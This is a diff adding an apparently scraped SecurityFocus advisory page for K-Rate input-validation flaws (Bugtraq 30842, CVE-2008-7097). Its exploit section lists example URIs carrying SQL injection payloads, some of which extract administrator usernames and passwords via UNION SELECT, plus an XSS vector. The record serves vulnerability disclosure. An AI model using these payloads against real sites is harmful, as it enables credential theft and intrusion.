@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid30842<p><b><span style="font-size: 18pt;">K-Rate Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/30842/info">info</a><br><a href="http://www.securityfocus.com/bid/30842/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/30842/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/30842/solution">solution</a><br><a href="http://www.securityfocus.com/bid/30842/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				30842
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-7097<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Aug 26 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:24PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Corwin
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Turn-K K-Rate  0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser. To exploit a cross-site scripting vulnerability, the attacker must entice a victim user to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/index.php?req=online&amp;amp;show=1SQL<br/>http://www.example.com/room/1SQL<br/>http://www.example.com/index.php?req=view&amp;amp;user=somegirl&amp;amp;id=2SQL&amp;amp;act=vote&amp;amp;image=3&amp;amp;voter=12 vote=3<br/>http://www.example.com/index.php?req=view&amp;amp;user=somegirl&amp;amp;id=2&amp;amp;act=vote&amp;amp;image=3SQL&amp;amp;voter=12&amp;amp;vote=3<br/>http://www.example.com/blog/somegirlSQL<br/>http://www.example.com/index.php?req=blog_edit&amp;amp;id=1SQL<br/>http://www.example.com/index.php?req=blog_edit&amp;amp;id=-1 union select 1,2,version(),4,5,6/*<br/>http://www.example.com/room/-1 union select 1,version(),3,4/*<br/>http://www.example.com/index.php?req=blog_edit&amp;amp;id=-1 union select 1,2,adm_user,4,5,6 from rate_admins where adm_id=1/* <br/>http://www.example.com/index.php?req=blog_edit&amp;amp;id=-1 union select 1,2,adm_pass,4,5,6 from rate_admins where adm_id=1/*  <br/>http://www.example.com/index.php?req=view&amp;amp;user=somegirl&amp;amp;id=2&amp;amp;act=vote&amp;amp;image=3&amp;amp;voter=12&amp;amp;vote=3XSS
+	
+		<ul>
+</ul>
+</div>
